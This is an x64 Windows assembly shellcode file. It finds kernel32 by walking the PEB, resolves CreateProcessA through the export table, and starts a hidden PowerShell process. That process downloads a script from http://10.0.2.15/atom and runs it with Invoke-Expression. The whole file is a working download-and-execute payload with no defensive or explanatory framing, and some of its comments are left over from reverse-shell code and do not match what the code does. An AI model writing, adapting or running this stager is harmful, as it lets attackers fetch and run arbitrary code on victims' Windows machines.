BITS 64
SECTION .text
global main
main:
mov QWORD [rsp-0x100],rsp
sub   RSP, 0x28                 ; 40 bytes of shadow space
and   RSP, 0FFFFFFFFFFFFFFF0h   ; Align the stack to a multiple of 16 bytes

; Parse PEB and find kernel32

xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi, [rax + 0x20]    ; RSI = PEB->Ldr.InMemOrder
lodsq                    ; RAX = Second module
xchg rax, rsi            ; RAX = RSI, RSI = RAX
lodsq                    ; RAX = Third(kernel32)
mov rbx, [rax + 0x20]    ; RBX = Base address


;
;    Go to the PE header (offset 0x3c)
;    Go to Export table (offset 0x88)
;    Go to the names table (offset 0x20)
;    Get the function name
;    Check if it starts with “GetProcA”
;    Go to the ordinals table (offset 0x24)
;    Get function number
;    Go to the address table (offset 0x1c)
;    Get the function address


; Parse kernel32 PE

xor r8, r8                 ; Clear r8
mov r8d, [rbx + 0x3c]      ; R8D = DOS->e_lfanew offset
mov rdx, r8                ; RDX = DOS->e_lfanew
add rdx, rbx               ; RDX = PE Header
mov r8d, [rdx + 0x88]      ; R8D = Offset export table
add r8, rbx                ; R8 = Export table
xor rsi, rsi               ; Clear RSI
mov esi, [r8 + 0x20]       ; RSI = Offset namestable
add rsi, rbx               ; RSI = Names table
xor rcx, rcx               ; RCX = 0
;mov r9, 0x41636f7250746547 ; GetProcA
mov r9,0x7250657461657243  ;CreatePr
mov r10,0x430041737365636F     ;ocessA
; Loop through exported functions and find CreateProcessA

Get_Function:

inc rcx                    ; Increment the ordinal
xor rax, rax               ; RAX = 0
mov eax, [rsi + rcx * 4]   ; Get name offset
add rax, rbx               ; Get function name
cmp QWORD [rax], r9        ; CreatePr ?
jnz Get_Function
mov rbp,QWORD [rax+0x8]
cmp rbp, r10        ; ocessA ?
jnz Get_Function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x24]       ; ESI = Offset ordinals
add rsi, rbx               ; RSI = Ordinals table
mov cx, [rsi + rcx * 2]    ; Number of function
xor rsi, rsi               ; RSI = 0
mov esi, [r8 + 0x1c]       ; Offset address table
add rsi, rbx               ; ESI = Address table
xor rdx, rdx               ; RDX = 0
mov edx, [rsi + rcx * 4]   ; EDX = Pointer(offset)
add rdx, rbx               ; RDX = GetProcAddress
mov rbp, rdx               ; Save GetProcAddress in RDI



shell:
call get_eip
mov rcx, rax
xor cl,cl
add rcx,cmd
  mov r8, rcx
  xor rdx,rdx
  push rdx                     ; an extra push for alignment
  push r8                     ; push our command line: 'cmd',0
  mov rdx, r8                ; save a pointer to the command line
  push rdi                    ; our socket becomes the shells hStdError
  push rdi                    ; our socket becomes the shells hStdOutput
  push rdi                    ; our socket becomes the shells hStdInput
  xor r8, r8                  ; Clear r8 for all the NULL's we need to push
  push byte 13                ; We want to place 104 (13 * 8) null bytes onto the stack
  pop rcx                     ; Set RCX for the loop
push_loop:                    ;
  push r8                     ; push a null qword
  loop push_loop              ; keep looping untill we have pushed enough nulls
  mov word [rsp+84], 0x0101   ; Set the STARTUPINFO Structure's dwFlags to STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  lea rax, [rsp+24]           ; Set RAX as a pointer to our STARTUPINFO Structure
  mov byte [rax], 104         ; Set the size of the STARTUPINFO Structure
  mov rsi, rsp                ; Save the pointer to the PROCESS_INFORMATION Structure 
  ; perform the call to CreateProcessA
  push rsi                    ; Push the pointer to the PROCESS_INFORMATION Structure 
  push rax                    ; Push the pointer to the STARTUPINFO Structure
  push r8                     ; The lpCurrentDirectory is NULL so the new process will have the same current directory as its parent
  push r8                     ; The lpEnvironment is NULL so the new process will have the same enviroment as its parent
  push r8                     ; We dont specify any dwCreationFlags 
  push r8                     ; Set bInheritHandles to TRUE in order to inheritable all possible handle from the parent

sub rsp, 20h
  mov r9, r8                  ; Set fourth param, lpThreadAttributes to NULL
                              ; r8 = lpProcessAttributes (NULL)
                            ; rdx = the lpCommandLine to point to "cmd",0
  xor rcx, rcx                 ; Set lpApplicationName to NULL as we are using the command line param instead

  call rbp                    ; CreateProcessA( 0, &"cmd", 0, 0, TRUE, 0, 0, 0, &si, &pi );
  
  ret

get_eip:
mov rax, [rsp]
ret
cmd:
db "powershell.exe -w hidden $t = (New-Object Net.WebClient).DownloadString('http://10.0.2.15:80/atom');Invoke-Expression $t;",0
